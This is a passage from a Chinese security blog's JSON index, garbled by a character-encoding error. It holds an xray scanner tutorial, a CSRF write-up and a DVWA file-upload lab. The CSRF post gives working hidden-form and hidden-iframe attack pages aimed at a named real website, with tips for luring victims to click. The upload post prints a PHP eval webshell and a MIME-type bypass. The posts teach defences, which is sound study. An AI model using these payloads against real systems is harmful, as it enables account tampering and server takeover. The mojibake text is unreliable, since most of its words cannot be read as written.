å¤åˆ¶å‡ºæ¥æ›¿æ¢åˆ°æµè§ˆå™¨ï¼Œåˆ·æ–°é¡µé¢ï¼ŒæˆåŠŸç™»é™†å—å®³è€…è´¦å· æ­é… XSS å¹³å°å¯ä»¥æ›´æ–¹ä¾¿çš„è·å–æ›´å¤šç”¨æˆ·ä¿¡æ¯ï¼Œå·²ç»æäº¤æ¼æ´ï¼Œä¸å†æ·±å…¥å»åˆ©ç”¨ã€‚ ä¿®å¤ æ·±åº¦è¿‡æ»¤æ•æ„Ÿæ ‡ç­¾ã€å‡½æ•°ã€å’Œäº‹ä»¶ï¼ŒåŒ…æ‹¬ä»–ä»¬çš„ç¼–ç ç»•è¿‡ç­‰(åŒ…æ‹¬ä½†ä¸é™äº)&lt;img&gt;ã€&lt;script&gt;ã€&lt;iframe&gt;ã€alert()ã€prompt()ã€confirm()ã€onclickäº‹ä»¶ã€onerroräº‹ä»¶ã€onmouseoveräº‹ä»¶ç­‰ cookie è®¾ç½® httponly","categories":[{"name":"å®‰å…¨","slug":"å®‰å…¨","permalink":"http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"æ¸—é€","slug":"æ¸—é€","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"},{"name":"å®‰å…¨","slug":"å®‰å…¨","permalink":"http://yoursite.com/tags/%E5%AE%89%E5%85%A8/"}]},{"title":"xray æ‰«æå™¨çš„ä½¿ç”¨(ä¸€)","slug":"xray æ‰«æå™¨çš„ä½¿ç”¨(ä¸€)","date":"2020-03-22T04:00:00.000Z","updated":"2020-03-28T01:52:06.809Z","comments":true,"path":"2020/03/22/xray æ‰«æå™¨çš„ä½¿ç”¨(ä¸€)/","link":"","permalink":"http://yoursite.com/2020/03/22/xray%20%E6%89%AB%E6%8F%8F%E5%99%A8%E7%9A%84%E4%BD%BF%E7%94%A8(%E4%B8%80)/","excerpt":"","text":"xray æ˜¯ä»é•¿äº­æ´é‰´æ ¸å¿ƒå¼•æ“ä¸­æå–å‡ºçš„ç¤¾åŒºç‰ˆæ¼æ´æ‰«æç¥å™¨ï¼Œæ”¯æŒä¸»åŠ¨ã€è¢«åŠ¨å¤šç§æ‰«ææ–¹å¼ï¼Œè‡ªå¤‡ç›²æ‰“å¹³å°ã€å¯ä»¥çµæ´»å®šä¹‰ POCï¼ŒåŠŸèƒ½ä¸°å¯Œï¼Œè°ƒç”¨ç®€å•ï¼Œæ”¯æŒ Windows / macOS / Linux å¤šç§æ“ä½œç³»ç»Ÿã€‚ 0x00 xray æ‰«æå™¨çš„ç‰¹è‰² ä½¿ç”¨ go è¯­è¨€ç¼–å†™ï¼Œè·¨å¹³å°ã€çº¯å¼‚æ­¥ã€æ— é˜»å¡ï¼Œå¹¶å‘èƒ½åŠ›å¼ºï¼Œæ‰«æé€Ÿåº¦å¿« æä¾›å¤šç§ä½¿ç”¨æ–¹å¼ï¼Œè°ƒç”¨å§¿åŠ¿æ–¹ä¾¿ï¼Œè¾“å…¥è¾“å‡ºéå¸¸æ ‡å‡†åŒ–ï¼Œæå…·å¯é›†æˆæ€§ ä½¿ç”¨ YAML é…ç½®æ–‡ä»¶éå¸¸æ–¹ä¾¿åœ°å®šä¹‰ POCï¼Œå¯ä»¥å¿«é€Ÿæ‰©å±•æ‰«æèƒ½åŠ› å…¨ç¨‹ä½¿ç”¨æ— å®³ POC è¿›è¡Œæ¢æµ‹ï¼Œåœ¨ç¡®ä¿èƒ½å‘ç°æ¼æ´çš„åŸºç¡€ä¸Šä¸ä¼šç»™ä¸šåŠ¡å¸¦æ¥ä¸¥é‡å½±å“ï¼Œéå¸¸é€‚ç”¨äºä¼ä¸šå†…éƒ¨å®‰å…¨å»ºè®¾ å‘½ä»¤è¡Œå¼çš„å…è´¹è¢«åŠ¨æ‰«æå·¥å…·ï¼Œä¸å¤šè§ è‡ªå¤‡ç›²æ‰“å¹³å°ï¼Œå¯æ£€æµ‹éœ€è¦åè¿æ‰èƒ½è§¦å‘çš„æ¼æ´ï¼Œå¦‚ï¼šå­˜å‚¨å‹ XSSã€æ— å›æ˜¾çš„ SSRFã€XXEã€å‘½ä»¤æ³¨å…¥ç­‰ 0x01 ä¸‹è½½ GitHubï¼šhttps://github.com/chaitin/xray ä¸‹è½½åœ°å€ï¼šhttps://github.com/chaitin/xray/releases å®˜æ–¹æ–‡æ¡£ï¼šhttps://xray.cool/xray/#/ ä¸‹è½½ç³»ç»Ÿå¯¹åº”çš„ç‰ˆæœ¬ç›´æ¥åœ¨æœ¬åœ°è¿è¡Œå³å¯ï¼Œä¾‹å¦‚ windows ç‰ˆæœ¬çš„ä¸‹è½½è§£å‹ååœ¨å‘½ä»¤è¡Œæ‰§è¡Œç›®å½•å†…çš„ xray_windows_386.exe æ–‡ä»¶ 0x02 å®‰è£…è¯ä¹¦æ£€æµ‹ HTTPS çš„ç½‘ç«™éœ€è¦å®‰è£…è¯ä¹¦ï¼Œxray è§£å‹ç›®å½•è‡ªå¸¦äº†è¯ä¹¦ ca.crtï¼ŒåŒå‡»å®‰è£…æˆ–è€…åœ¨æµè§ˆå™¨å†…å¯¼å…¥ (Firefox æµè§ˆå™¨åªèƒ½åœ¨æµè§ˆå™¨å†…å¯¼å…¥è¯ä¹¦) ä¹Ÿå¯ä»¥ä½¿ç”¨å‘½ä»¤ç”Ÿæˆæ–°çš„è¯ä¹¦ 1xray_windows_386.exe genca 0x03 åŸºç¡€ç”¨æ³•çˆ¬è™«è‡ªåŠ¨æ‰«æ1xray_windows_386.exe webscan --basic-crawler http:&#x2F;&#x2F;www.baidu.com è¢«åŠ¨æ‰«æ1.å¼€å¯ xray æœåŠ¡ï¼Œè®¾ç½®ç›‘å¬ç«¯å£ã€è¾“å‡ºçš„æŠ¥å‘Š 1xray_windows_386.exe webscan --listen 127.0.0.1:7777 --html-output test.html 2.æµè§ˆå™¨å¯ç”¨ä»£ç†ï¼Œç«¯å£ä¸ xray ä¸€è‡´ (æ­¤å¤„æ˜¯ä»¥ç«ç‹æµè§ˆå™¨ FoxyProxy ä»£ç†æ’ä»¶ä¸ºä¾‹) 3.æ‰‹åŠ¨åœ¨ç½‘é¡µä¸Šè¿›è¡Œæ“ä½œï¼Œè¯·æ±‚å°±ä¼šè‡ªåŠ¨è¢« xray æ•è·ï¼Œå¹¶ä¸”è‡ªåŠ¨æ£€æµ‹æ¼æ´ï¼Œæ£€æµ‹åˆ°çš„æ¼æ´åœ¨å‘½ä»¤è¡Œä¸­æ˜¾ç¤ºçº¢è‰²ï¼ŒåŒæ—¶ä¼šç”Ÿæˆä¸€ä¸ª htmlæ ¼å¼çš„æ¼æ´æŠ¥å‘Š åœ¨æŠ¥å‘Šæ–‡ä»¶ä¸­ç‚¹å‡»æ¼æ´æ‰€åœ¨çš„è¡Œå¯ä»¥æŸ¥çœ‹æ¼æ´è¯¦æƒ… 0x04 é…ç½®ä¿¡æ¯xray ç›®å½•ä¸‹çš„ config.yaml æ–‡ä»¶åŒ…å«äº†æ‰€æœ‰çš„é…ç½®ä¿¡æ¯ï¼Œé…ç½®ä¸»è¦æ˜¯å…­ä¸ªå¤§ç±» plugins log mitm basic_crawler reverse http ä»¥ä¸‹æ˜¯å‡ ä¸ªå¸¸ç”¨çš„å¯èƒ½éœ€è¦æ‰‹åŠ¨ä¿®æ”¹çš„é…ç½® 1. è®¾ç½®å…è®¸æ‰«æçš„åŸŸåé…ç½®æ–‡ä»¶ä¸­ includes é»˜è®¤ - &#39;*&#39;ï¼Œè¡¨ç¤ºæµè§ˆå™¨ä¸Šæ‰€æœ‰è®¿é—®çš„ç½‘ç«™éƒ½ä¼šæ‰«ææ£€æµ‹ï¼Œä¸ºäº†ä¾¿äºè°ƒè¯•éœ€è¦ä¿®æ”¹ä¸ºä»…æ‰«ææŸä¸ªæˆ–æŸäº›ç½‘ç«™ã€‚includes: æ˜¯å…è®¸æ‰«æçš„åŸŸåï¼Œexcludes: æ˜¯ä¸å…è®¸æ‰«æçš„åŸŸåï¼Œå¯ä»¥ä½¿ç”¨æ˜Ÿå·åŒ¹é… 1234567mitm: restriction: includes: # å…è®¸æ‰«æçš„åŸŸï¼Œæ­¤å¤„æ— åè®® - &#39;example.com&#39; # è¡¨ç¤ºå…è®¸æ‰«æ example.com - &#39;*.example.com&#39; # è¡¨ç¤ºå…è®¸æ‰«æ *.example.com æ‰€æœ‰å­åŸŸå excludes: - &#39;a.example.com&#39; # è¡¨ç¤ºä¸æ‰«æ a.example.com 2. ä¸ºä»£ç†æ·»åŠ è®¤è¯æ·»åŠ ç”¨æˆ·åå¯†ç åï¼Œåœ¨ä½¿ç”¨æµè§ˆå™¨æ—¶å°±éœ€è¦å¡«å†™è®¤è¯ä¿¡æ¯ 1234mitm: auth: username: &quot;admin&quot; password: &quot;password&quot; 3. æ‰«ææ’ä»¶é…ç½®æ’ä»¶é…ç½®ä¿®æ”¹ä¸»è¦æ˜¯å¼€å¯å’Œå…³é—­ï¼Œé»˜è®¤æ˜¯å…¨éƒ¨å¼€å¯ï¼Œæ‰«ææ—¶æ£€æµ‹å…¨éƒ¨ç±»å‹çš„æ¼æ´ï¼Œä¸éœ€è¦æ£€æµ‹çš„æ¼æ´ç±»å‹ä¿®æ”¹ä¸º false 123456789plugins: xss: enabled: true # æ£€æµ‹ xss ie_feature: false include_cookie: false cmd_injection: enabled: false # ä¸æ£€æµ‹å‘½ä»¤æ³¨å…¥ detect_blind_injection: false ... æ£€æµ‹æ¼æ´ç±»å‹ä¹Ÿå¯ä»¥ä¸ä¿®æ”¹é…ç½®ä¿¡æ¯ï¼Œåœ¨å‘½ä»¤è¡Œå¼€å¯ xray çš„æ—¶å€™ä½¿ç”¨ --plugins å‚æ•°æŒ‡å®šå³å¯ï¼Œå¤šä¸ªæ’ä»¶ä¹‹é—´ç”¨é€—å·åˆ†éš”ï¼Œæ‰«ææ¼æ´çš„æ—¶å€™å°±åªä¼šæ‰«æè¿™å‡ ç§æ¼æ´ç±»å‹ 1xray_windows_386.exe webscan --listen 127.0.0.1:7777 --plugins xss,xxe,cmd_injection 4. å‘åŒ…é€Ÿç‡é™åˆ¶é˜²æ­¢è¯·æ±‚å¤ªå¿«è¢« waf æ‹¦æˆªï¼Œå¯ä»¥å°†æ¯ç§’è¯·æ±‚æ•°å‡å°ï¼Œé»˜è®¤æ¯ç§’ 500 12http: max_qps: 10 # æ¯ç§’æœ€å¤§è¯·æ±‚æ•° 5. æ‰«æä»£ç†é…ç½®è®¾ç½®ä»£ç†å¯ä»¥ä¸ burp suite ç­‰å…¶ä»–è½¯ä»¶è”åŠ¨ä½¿ç”¨ 12http: proxy: &quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot; # æ¼æ´æ‰«ææ—¶ä½¿ç”¨çš„ä»£ç† 0x05 xray ä¸ burp suite è”åŠ¨ä½¿ç”¨1. burp suite ä½œä¸º xray çš„ä¸Šæ¸¸ä»£ç†(æŠ“å– xray å‘åŒ…) 2. xray ä½œä¸º burp suite çš„ä¸Šæ¸¸ä»£ç†(ååŠ©æµ‹è¯•)","categories":[{"name":"å®‰å…¨","slug":"å®‰å…¨","permalink":"http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"æ¸—é€","slug":"æ¸—é€","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"},{"name":"å®‰å…¨","slug":"å®‰å…¨","permalink":"http://yoursite.com/tags/%E5%AE%89%E5%85%A8/"}]},{"title":"Webå®‰å…¨ - CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰","slug":"Webå®‰å…¨ - CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰","date":"2020-01-11T04:00:00.000Z","updated":"2020-04-12T10:34:01.485Z","comments":true,"path":"2020/01/11/Webå®‰å…¨ - CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰/","link":"","permalink":"http://yoursite.com/2020/01/11/Web%E5%AE%89%E5%85%A8%20-%20CSRF%EF%BC%88%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%89/","excerpt":"","text":"ä»€ä¹ˆæ˜¯ CSRFCSRF æ¼æ´æ˜¯åˆ©ç”¨å·²ç»ç™»é™†çš„ç”¨æˆ·ï¼Œåœ¨ç”¨æˆ·ä¸çŸ¥æƒ…çš„çŠ¶å†µä¸‹ï¼Œä»¥ç”¨æˆ·çš„åä¹‰è¿›è¡Œéæ³•æ“ä½œï¼Œä¾‹å¦‚æ¶æ„è¯„è®ºã€å‘å¸–ã€ç‚¹èµã€è½¬è´¦ç­‰ã€‚ æ¼æ´èƒŒæ™¯è¿™æ˜¯æˆ‘åœ¨æŸå”®å– IP ä»£ç†çš„ç½‘ç«™çš„ä¸ªäººä¸­å¿ƒé¡µé¢ï¼Œæµ‹è¯•è¿‡ç¨‹ä¸­å‘ç°è¿™é‡Œæœ‰å‡ ä¸ªæ¥å£æ˜¯å­˜åœ¨ CSRF æ¼æ´çš„ã€‚æ¯”å¦‚ä¸‹å›¾ä¸­çš„ä¿®æ”¹é…ç½®ï¼Œè¿™æ˜¯ä¸€ä¸ªpostè¯·æ±‚ï¼Œåªæœ‰ä¸¤ä¸ªå‚æ•°ï¼Œåˆ†åˆ«å¯¹åº”è¿‡æ»¤çš„å¤©æ•°å’Œè¿‡æ»¤æ¨¡å¼ï¼Œæ²¡æœ‰å…¶ä»–çš„æ ¡éªŒå‚æ•°ã€‚ å†é€šè¿‡æŠ“åŒ…ä¿®æ”¹è¯·æ±‚å¤´ï¼Œå°†è¯·æ±‚å¤´ä¸­çš„ referer å­—æ®µåˆ é™¤ï¼Œä»ç„¶èƒ½å¤Ÿè¯·æ±‚å¹¶æˆåŠŸä¿®æ”¹é…ç½®ï¼Œè¯´æ˜ referer ä¹Ÿæ²¡æœ‰æ ¡éªŒã€‚è¿™å°±ç•™ä¸‹äº†ä¸€ä¸ªæ˜æ˜¾çš„ CSRF æ¼æ´ã€‚ éªŒè¯åˆ©ç”¨æ¼æ´ä¸‹é¢æ¨¡æ‹Ÿæ”»å‡»è€…çš„è§’åº¦éªŒè¯æ¼æ´çš„åˆ©ç”¨è¿‡ç¨‹ã€‚ æ–°ç”¨æˆ·é»˜è®¤è¿‡æ»¤å¤©æ•°æ˜¯1ï¼Œè¿‡æ»¤æ¨¡å¼æ˜¯ä¸¥æ ¼æ¨¡å¼ï¼Œæˆ‘ä»¬æ¶æ„ä»£ç ä¸ºäº†åŒºåˆ†ç»“æœï¼Œå°†è¿‡æ»¤å¤©æ•°è®¾ç½®ä¸º3ï¼Œè¿‡æ»¤æ¨¡å¼ä¸ºæ™ºèƒ½æ¨¡å¼ é¦–å…ˆæ–°å»ºä¸€ä¸ª csrf1.html æ–‡ä»¶ï¼Œåœ¨ body å†…ç¼–è¾‘ä¸€ä¸ª form è¡¨å•ï¼Œaction çš„è·¯å¾„å°±æ˜¯è¿™ä¸ªä¿®æ”¹é…ç½®çš„æ¥å£åœ°å€ã€‚ä¸ºäº†ä½¿å¾—æ”»å‡»çš„è¿‡ç¨‹éšç§˜ä¸è¢«å‘ç°ï¼Œå°† input æ ‡ç­¾çš„ç±»å‹éƒ½è®¾ç½®ä¸ºéšè—ä¸å±•ç¤ºã€‚ 1234567891011121314151617&lt;!DOCTYPE html&gt;&lt;html lang=\"en\" dir=\"ltr\"&gt; &lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=\"https://www.apeyun.com/user/user/config\" method=\"post\" id=\"transferForm\" name=\"form1\"&gt; &lt;input type=\"hidden\" name=\"filter_duration\" value=\"3\"&gt; &lt;input type=\"hidden\" name=\"filter_mode\" value=\"2\"&gt; &lt;/form&gt; &lt;/body&gt; &lt;script&gt; &lt;!-- ä¸€æ‰“å¼€é¡µé¢ç›´æ¥è‡ªåŠ¨æäº¤è¡¨å• --&gt; document.form1.submit(); &lt;/script&gt;&lt;/html&gt; ç„¶åå—å®³è€…ä½¿ç”¨ç™»é™†äº†æ­¤ç½‘ç«™çš„æµè§ˆå™¨æ‰“å¼€åˆ›å»ºçš„ HTML æ–‡ä»¶ï¼ˆè¿™é‡Œæ˜¯æˆ‘æ³¨å†Œçš„æµ‹è¯•è´¦å·ï¼‰ï¼Œç›´æ¥è¿”å›äº†é…ç½®æˆåŠŸã€‚åˆ·æ–°åŸé¡µé¢ï¼Œå¯ä»¥çœ‹åˆ°å—å®³è€…çš„é…ç½®è¢«ä¿®æ”¹æˆäº† csrf1.html ä¸­çš„å†…å®¹ï¼Œæ¼æ´å·²ç»åˆ©ç”¨æˆåŠŸã€‚ çœŸå®çš„æ”»å‡»åœºæ™¯ä¸€èˆ¬ä¸ä¼šæŠŠæ¶æ„è„šæœ¬æ–‡ä»¶å‘é€åˆ°å—å®³è€…æœ¬åœ°ï¼Œé‚£æ ·å¤ªéº»çƒ¦äº†ï¼Œä¸” form è¡¨å•æäº¤æ—¶æµè§ˆå™¨æœ‰æ˜æ˜¾çš„è·³è½¬è¿‡ç¨‹å’Œè¿”å›ä¿¡æ¯ï¼Œå®¹æ˜“è¢«å—å®³è€…å¯Ÿè§‰ã€‚ç»§ç»­æ¥éšè—æ”»å‡»è¿‡ç¨‹ï¼šåˆ›å»ºä¸€ä¸ª csrf2.html æ–‡ä»¶, img æ ‡ç­¾è®¾ç½®ä¸€ä¸ªä»»æ„å›¾ç‰‡ï¼Œiframe æ ‡ç­¾è®¾ç½®ä¸ºéšè—ï¼Œé€šè¿‡ src å±æ€§è·³è½¬åˆ°ä¸Šä¸€æ­¥åˆ›å»ºçš„ csrf1.html æ–‡ä»¶ã€‚ 1234567891011&lt;!DOCTYPE html&gt;&lt;html lang=\"en\" dir=\"ltr\"&gt; &lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;img src=\"https://www.wshangw.net/uploads/allimg/200104/1-2001041006390-L.png\"&gt; &lt;iframe src=\"csrf1.html\" style=\"display:none;\"&gt;&lt;/iframe&gt; &lt;/body&gt;&lt;/html&gt; åœ¨æˆ‘çš„æµ‹è¯•æœåŠ¡å™¨å¼€å¯ HTTP æœåŠ¡ï¼ŒæŠŠè¿™ä¸¤ä¸ªæ–‡ä»¶æ”¾åˆ°æœåŠ¡å™¨ï¼Œå°† csrf2.html æ–‡ä»¶åœ°å€å‘é€ç»™å—å®³è€…ï¼Œé…åˆä¸€äº›è¯±å¯¼æ€§çš„è¯è¯­éª—å–å—å®³äººçš„ä¿¡ä»»å»ç‚¹å‡»é“¾æ¥ã€‚ä¾‹å¦‚ï¼š å½“ä»–ç‚¹å‡»é“¾æ¥ä»¥åï¼Œæ— è®ºäºŒç»´ç æ˜¯ä¸æ˜¯ä»–çš„å·²ç»ä¸é‡è¦äº†ï¼Œå› ä¸ºæ”»å‡»è¡Œä¸ºå·²ç»æˆåŠŸï¼Œåœ¨å—å®³è€…å®Œå…¨æ— æ„Ÿè§‰çš„æƒ…å†µä¸‹ã€‚ å—å®³è€…çš„æµè§ˆå™¨åˆ·æ–°é¡µé¢ï¼Œå¯ä»¥çœ‹åˆ°é…ç½®å·²ç»è¢«ä¿®æ”¹ ä¸ªäººä¸­å¿ƒé¡µé¢ä¿®æ”¹è°ƒç”¨å¯†é’¥çš„æ¥å£åŒæ ·å­˜åœ¨ CSRF æ¼æ´ï¼Œè¿™ä¸ªæ¥å£çš„å®‰å…¨åº¦æ›´ä½ï¼Œç›´æ¥ä½¿ç”¨äº† get è¯·æ±‚ï¼Œå¹¶ä¸”æ²¡æœ‰è¯·æ±‚å‚æ•°ï¼Œåªè¦è¯·æ±‚ä¸€ä¸‹è¿™ä¸ªæ¥å£ï¼Œå¯†é’¥å°±ä¼šç›´æ¥ä¿®æ”¹ï¼Œå‰é¢çš„æ¼æ´åˆ©ç”¨æ–¹æ³•åœ¨è¿™é‡ŒåŒæ ·å¯è¡Œï¼Œä¸‹å›¾gifæ˜¯æ¼”ç¤ºæ•ˆæœã€‚ ä¸è¿‡è¿™ä¸ªé¡µé¢ä¿®æ”¹å¯†ç çš„åŠŸèƒ½éœ€è¦ç”¨æˆ·è¾“å…¥å½“å‰æ­£åœ¨ä½¿ç”¨çš„å¯†ç ï¼Œè¿™å°±èƒ½å¾ˆå¥½çš„æœç»æ”»å‡»è€…é€šè¿‡ CSRF ç›´æ¥ä¿®æ”¹å—å®³è€…çš„å¯†ç ï¼Œå› ä¸ºæ”»å‡»è€…æ­¤æ—¶æ— æ³•çŒœæµ‹ç”¨æˆ·çš„å½“å‰å¯†ç ï¼Œè‡ªç„¶æ— æ³•æ„é€ è¯·æ±‚ã€‚ CSRF æ¼æ´çš„é˜²å¾¡ æ ¡éªŒ Referer è¯·æ±‚ä¸­åŠ å…¥éšæœº Token éªŒè¯ç ï¼ˆä¼šç‰ºç‰²ç”¨æˆ·ä½“éªŒï¼‰ é™åˆ¶ session å¯¿å‘½å‘¨æœŸï¼ˆä½¿ç”¨æˆ·ä¸è¦é•¿æ—¶é—´ä¿æŒç™»é™†æ€ï¼Œç¼“è§£csrfï¼‰","categories":[{"name":"å®‰å…¨","slug":"å®‰å…¨","permalink":"http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"æ¸—é€","slug":"æ¸—é€","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"},{"name":"å®‰å…¨","slug":"å®‰å…¨","permalink":"http://yoursite.com/tags/%E5%AE%89%E5%85%A8/"}]},{"title":"Webå®‰å…¨ - æ–‡ä»¶ä¸Šä¼ æ¼æ´","slug":"Webå®‰å…¨ - æ–‡ä»¶ä¸Šä¼ æ¼æ´","date":"2019-12-18T04:00:00.000Z","updated":"2020-04-12T10:38:20.611Z","comments":true,"path":"2019/12/18/Webå®‰å…¨ - æ–‡ä»¶ä¸Šä¼ æ¼æ´/","link":"","permalink":"http://yoursite.com/2019/12/18/Web%E5%AE%89%E5%85%A8%20-%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"ä»€ä¹ˆæ˜¯æ–‡ä»¶ä¸Šä¼ æ¼æ´ç”±äºç®¡ç†å‘˜åœ¨ä»£ç ç¼–å†™ã€ç¯å¢ƒé…ç½®ã€æƒé™ç®¡ç†ç­‰æ–¹é¢çš„ç–å¿½ï¼Œç”¨æˆ·åœ¨å®¢æˆ·ç«¯èƒ½å¤Ÿä¸Šä¼ è„šæœ¬æ–‡ä»¶ï¼Œå¹¶ä¸”æœ‰æƒé™åœ¨æœåŠ¡å™¨æ‰§è¡Œï¼Œå°±ä¼šå¯¼è‡´æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥ä¸Šä¼ æœ¨é©¬ã€webshell ç­‰æ¶æ„è„šæœ¬ï¼Œè·å–æœåŠ¡å™¨æƒé™ã€æ•æ„Ÿä¿¡æ¯ï¼Œå±å®³å¾ˆå¤§ã€‚ ä¸‹é¢æ–‡ç« é€šè¿‡å¼€æºçš„ DVWA æ¸—é€æµ‹è¯•ç¯å¢ƒä¸ºä¾‹ï¼Œæ¥æ¨¡æ‹Ÿæ–‡ä»¶ä¸Šä¼ æ¼æ´çš„åˆ©ç”¨è¿‡ç¨‹ï¼ŒDVWA é¶æœºçš„åå°æ˜¯ PHP è¯­è¨€ï¼Œå…¶ä»–è¯­è¨€çš„åå°æ¼æ´åŸç†å’Œé˜²å¾¡æ€è·¯éƒ½æ˜¯ç›¸é€šçš„ã€‚DVWA å…±æœ‰å››ä¸ªç­‰çº§ï¼š low (ä½å®‰å…¨ç­‰çº§) medium (ä¸­å®‰å…¨ç­‰çº§) high (é«˜å®‰å…¨ç­‰çº§) impossible (æœ€é«˜ç­‰çº§) å…¶ä¸­ impossible ç­‰çº§æ˜¯æœ€å®‰å…¨çš„ç­‰çº§ï¼Œä¸å­˜åœ¨æ¼æ´ï¼ˆæˆ‘çš„èƒ½åŠ›èŒƒå›´å†…ï¼‰ã€‚ æ„é€ è„šæœ¬åœ¨æœ¬åœ°åˆ›å»ºä¸€ä¸ª 1.php æ–‡ä»¶ï¼Œå†…å®¹åªæœ‰ä¸€è¡Œï¼Œæ˜¯phpä¸€å¥è¯æœ¨é©¬ï¼Œä¹Ÿå°±æ˜¯ç®€å•çš„webshellã€‚è®©è¢«æ”»å‡»çš„æœåŠ¡å™¨è§£ææ­¤æ–‡ä»¶ï¼Œé€šè¿‡ get æ–¹æ³•è·å–è¯·æ±‚å‚æ•°cmdï¼Œå¹¶ä½¿ç”¨ eval å‡½æ•°æ¥æ‰§è¡Œã€‚ 1&lt;?php eval($_GET[\"cmd\"]);?&gt; ä¸Šä¼ æ–‡ä»¶low ç­‰çº§ç™»é™† DVWA ç¯å¢ƒï¼Œè¿›å…¥æ–‡ä»¶ä¸Šä¼ æ¨¡å—å¹¶ä¸Šä¼ åˆ›å»ºçš„ 1.php æ¶æ„æ–‡ä»¶ï¼Œæ²¡æœ‰ä»»ä½•é˜»ç¢ï¼Œç›´æ¥ä¸Šä¼ æˆåŠŸï¼Œå¹¶ä¸”ç»™å‡ºäº†æ–‡ä»¶ä¿å­˜çš„è·¯å¾„ã€‚ medium ç­‰çº§æŒ‰ç…§ä¸Šä¸€æ­¥ç›´æ¥ä¸Šä¼ ï¼Œå‘ç°ä¸Šä¼ å¤±è´¥ï¼Œæç¤ºåªèƒ½ä¸Šä¼ å›¾ç‰‡æ ¼å¼çš„æ–‡ä»¶ æœåŠ¡å™¨æ˜¯æ ¡éªŒäº†æˆ‘ä»¬çš„æ–‡ä»¶åç¼€åå—ï¼Œå°† 1.php çš„æ–‡ä»¶åä¿®æ”¹æˆ 666.png å›¾ç‰‡æ ¼å¼å°è¯•ä¸€ä¸‹ å¯ä»¥ä¸Šä¼ æˆåŠŸï¼Œä½†æ˜¯é€šè¿‡ä¿®æ”¹åç¼€çš„æ–¹å¼ï¼Œå®ƒå¹¶ä¸æ˜¯ä¸€ä¸ªæ ‡å‡†çš„å›¾ç‰‡æˆ–è€…phpæ–‡ä»¶ï¼Œæœ‰ä»€ä¹ˆåŠæ³•å¯ä»¥ä¸Šä¼ phpæ–‡ä»¶ä½†æ˜¯ä¸è¢«æ£€æµ‹åˆ°ï¼Ÿ å…ˆæ­£å¸¸ä¸Šä¼ ä¸€å¼ å›¾ç‰‡ï¼Œè§‚å¯Ÿä¸Šä¼ æ–‡ä»¶çš„ HTTP è¯·æ±‚ï¼Œå¯ä»¥çœ‹åˆ°è¯·æ±‚å‚æ•°ä¸­çš„ Content-Type æ˜¯ image/jpegï¼Œmedium å®‰å…¨ç­‰çº§æ£€æµ‹å°±æ˜¯è¿™ä¸ªå­—æ®µã€‚ è¿™é‡Œéœ€è¦é€šè¿‡æŠ“åŒ…ä¿®æ”¹è¯·æ±‚äº†ï¼Œä»¥ Charles ä¸ºä¾‹ï¼Œå¼€å¯å®ƒçš„è¯·æ±‚æ‹¦æˆªåŠŸèƒ½ï¼Œé…ç½®å¥½æµè§ˆå™¨ä»£ç†ï¼Œé€‰æ‹© 1.php æ–‡ä»¶å¹¶ç‚¹å‡»ä¸Šä¼ ï¼Œè¯·æ±‚è¢« Charles æ‹¦æˆªï¼Œå½“å‰è¯·æ±‚å‚æ•°ä¸­çš„ Content-Type å€¼æ˜¯ application/octet-stream, æŠŠå®ƒä¿®æ”¹ä¸º image/jpeg å¹¶å°†ä¿®æ”¹åçš„è¯·æ±‚æ”¾è¡Œã€‚ æ­¤æ—¶å‰ç«¯é¡µé¢æ˜¾ç¤ºä¸Šä¼ æˆåŠŸã€‚ è¿™é‡Œä¿®æ”¹çš„ Content-Type å®é™…ä¸Šæ˜¯éµå¾ªäº† MIME æ ‡å‡†, jpeã€jpgã€jpegç­‰åç¼€çš„æ–‡ä»¶å¯¹åº”çš„ç±»å‹éƒ½æ˜¯ image/jpegï¼Œè¿˜å¯ä»¥ä¿®æ”¹æˆå…¶ä»–çš„ç±»å‹ï¼Œå…·ä½“çš„åœºæ™¯å…·ä½“åˆ†æéœ€è¦é€‰æ‹©å“ªä¸€ç§ MIME (Multipurpose Internet Mail Extensions) æ˜¯æè¿°æ¶ˆæ¯å†…å®¹ç±»å‹çš„å› ç‰¹ç½‘æ ‡å‡†ã€‚MIME æ¶ˆæ¯èƒ½åŒ…å«æ–‡æœ¬ã€å›¾åƒã€éŸ³é¢‘ã€è§†é¢‘ä»¥åŠå…¶ä»–åº”ç”¨ç¨‹åºä¸“ç”¨çš„æ•°æ®ã€‚ æ›´å¤šè¯·æŸ¥çœ‹ MIME å‚è€ƒæ‰‹å†Œã€‚ high ç­‰çº§ç›´æ¥ä½¿ç”¨å‰ä¸¤æ­¥çš„æ–¹æ³•è¿›è¡Œä¸Šä¼ ï¼Œéƒ½ä¸èƒ½ä¸Šä¼ æˆåŠŸï¼Œåœ¨ high å®‰å…¨ç­‰çº§ä¸‹ï¼Œå…¶å®è¿˜æ ¡éªŒäº†å›¾ç‰‡çš„å…·ä½“å†…å®¹ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ä¸­å¦‚æœåªæœ‰æ¶æ„ä»£ç è‚¯å®šä¼šè¢«æ‹¦æˆªï¼Œç»•è¿‡æ–¹å¼å°±æ˜¯åˆ¶ä½œå›¾ç‰‡æœ¨é©¬ã€‚åœ¨æœ¬åœ°é€‰æ‹©ä¸€ä¸ª 1.jpg 